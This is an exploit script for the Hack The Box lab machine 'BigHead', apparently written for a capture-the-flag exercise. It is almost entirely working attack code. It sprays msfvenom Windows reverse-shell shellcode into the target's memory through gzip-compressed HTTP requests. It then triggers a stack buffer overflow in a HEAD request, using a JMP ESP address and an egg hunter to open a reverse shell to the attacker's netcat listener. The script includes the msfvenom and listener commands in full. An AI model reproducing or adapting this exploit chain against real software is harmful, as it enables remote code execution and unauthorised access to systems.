#!/usr/bin/env python
# https://www.hackthebox.eu/home/machines/profile/164
# http://docs.pwntools.com/en/stable/
# schex / dualfade

# Attack Flow --
# Attacker -> LB:80 (nginx proxy)-> BigHeadWebServer:8008 PE 32bit (Custom EXE app)
# nc -4 -lnvp 53 <- BigHeadWebServer (reverse shell) 

from pwn import *
import zlib

# TARGET
host = "dev.bighead.htb"
port = "80"

# SHELLCODE --
# sudo msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.14.17 LPORT=53 EXITFUNC=thread -f python -b '\x00\x0a\x0d\xcc\x20'
# Payload size: 351 bytes
# Final size of python file: 1684 bytes

buf =  ""
buf += "\xdb\xc2\xbe\x84\x9d\xca\xf2\xd9\x74\x24\xf4\x5f\x31"
buf += "\xc9\xb1\x52\x31\x77\x17\x03\x77\x17\x83\x43\x99\x28"
buf += "\x07\xb7\x4a\x2e\xe8\x47\x8b\x4f\x60\xa2\xba\x4f\x16"
buf += "\xa7\xed\x7f\x5c\xe5\x01\x0b\x30\x1d\x91\x79\x9d\x12"
buf += "\x12\x37\xfb\x1d\xa3\x64\x3f\x3c\x27\x77\x6c\x9e\x16"
buf += "\xb8\x61\xdf\x5f\xa5\x88\x8d\x08\xa1\x3f\x21\x3c\xff"
buf += "\x83\xca\x0e\x11\x84\x2f\xc6\x10\xa5\xfe\x5c\x4b\x65"
buf += "\x01\xb0\xe7\x2c\x19\xd5\xc2\xe7\x92\x2d\xb8\xf9\x72"
buf += "\x7c\x41\x55\xbb\xb0\xb0\xa7\xfc\x77\x2b\xd2\xf4\x8b"
buf += "\xd6\xe5\xc3\xf6\x0c\x63\xd7\x51\xc6\xd3\x33\x63\x0b"
buf += "\x85\xb0\x6f\xe0\xc1\x9e\x73\xf7\x06\x95\x88\x7c\xa9"
buf += "\x79\x19\xc6\x8e\x5d\x41\x9c\xaf\xc4\x2f\x73\xcf\x16"
buf += "\x90\x2c\x75\x5d\x3d\x38\x04\x3c\x2a\x8d\x25\xbe\xaa"
buf += "\x99\x3e\xcd\x98\x06\x95\x59\x91\xcf\x33\x9e\xd6\xe5"
buf += "\x84\x30\x29\x06\xf5\x19\xee\x52\xa5\x31\xc7\xda\x2e"
buf += "\xc1\xe8\x0e\xe0\x91\x46\xe1\x41\x41\x27\x51\x2a\x8b"
buf += "\xa8\x8e\x4a\xb4\x62\xa7\xe1\x4f\xe5\xc2\xff\x41\xe4"
buf += "\xba\xfd\x5d\x06\x0e\x8b\xbb\x6c\x60\xdd\x14\x19\x19"
buf += "\x44\xee\xb8\xe6\x52\x8b\xfb\x6d\x51\x6c\xb5\x85\x1c"
buf += "\x7e\x22\x66\x6b\xdc\xe5\x79\x41\x48\x69\xeb\x0e\x88"
buf += "\xe4\x10\x99\xdf\xa1\xe7\xd0\xb5\x5f\x51\x4b\xab\x9d"
buf += "\x07\xb4\x6f\x7a\xf4\x3b\x6e\x0f\x40\x18\x60\xc9\x49"
buf += "\x24\xd4\x85\x1f\xf2\x82\x63\xf6\xb4\x7c\x3a\xa5\x1e"
buf += "\xe8\xbb\x85\xa0\x6e\xc4\xc3\x56\x8e\x75\xba\x2e\xb1"
buf += "\xba\x2a\xa7\xca\xa6\xca\x48\x01\x63\xea\xaa\x83\x9e"
buf += "\x83\x72\x46\x23\xce\x84\xbd\x60\xf7\x06\x37\x19\x0c"
buf += "\x16\x32\x1c\x48\x90\xaf\x6c\xc1\x75\xcf\xc3\xe2\x5f"

# -----------------------------------------------------------
# !mona jmp -r esp --
# Log data, item 7
# Address=62501331
# Message=  0x62501331 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, 
# Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Downloads\BHWS_Backup\bHeadSvr.dll)

# echo "31135062" | xxd -p -u | sed -r 's/(..)/\\x\1/g'
# \x33\x31\x31\x33\x35\x30\x36\x32\x0A
# -----------------------------------------------------------

# @62501331 FFE4 JMP ESP
eip = "\x33\x31\x31\x33\x35\x30\x36\x32\x0A"

# EGG HUNTER --
# '\x70\x30\x30\x66' = p00f
hunter = "" # @p00fp00f -cpb '\x00' 
hunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
hunter += "\xef\xb8\x70\x30\x30\x66\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# -----------------------------------------------------------
# STAGE1 --
# Send normal http POST Request --
# zlib compressed payload into target memory --
# -----------------------------------------------------------
payload = ""
payload += "p00fp00f"
payload += "\x90"*8
payload += buf

stage1 = ""
stage1 += "POST / HTTP/1.1\r\nContent-Encoding: gzip\r\nHost: " + host + ":" + port + "\r\n"
stage1 += "Content-Length: {}\r\n\r\n".format(len(payload)) + zlib.compress(payload) + "\r\n\r\n"

# -----------------------------------------------------------
# STAGE2 --
# Overflow EIP / Spawn Reverse Shell --
# STAGE2: Overflow  / Shellcode --
# "HEAD /coffee" + "\x41"*66 + "\x42"*8 + "\x43"*88
# -----------------------------------------------------------

stage2 = ""
stage2 += "HEAD /coffee" + "\x41"*66 + "\x33\x31\x31\x33\x35\x30\x36\x32"
stage2 += hunter
stage2 += " HTTP/1.1 \r\nHost: " + host + ":" + port + "\r\n\r\n"

# -----------------------------------------------------------
# Send Payload and exploit
# -----------------------------------------------------------

# Sending 10 Requests to fill target memory --
# Load balancer with 8 instances running --
# Egg / Nops / Shellcode into target mem -- 
print "[+] Sending Requests"
print "[+] Sending Egg + Nops + Shellcode\n"
for i in range(10):
    r = remote(host, port)
    r.send(stage1)
    r.close()

# Overflow / egg hunter / exec rev shell --
print "\n[+] Sending Overflow + Hunter"
r = remote(host, port)
r.send(stage2)
print(r.recvline(timeout=5))
r.close()
print "[+] Spawning reverse shell"
print "[+] Shell ??\n"

# __EOF __
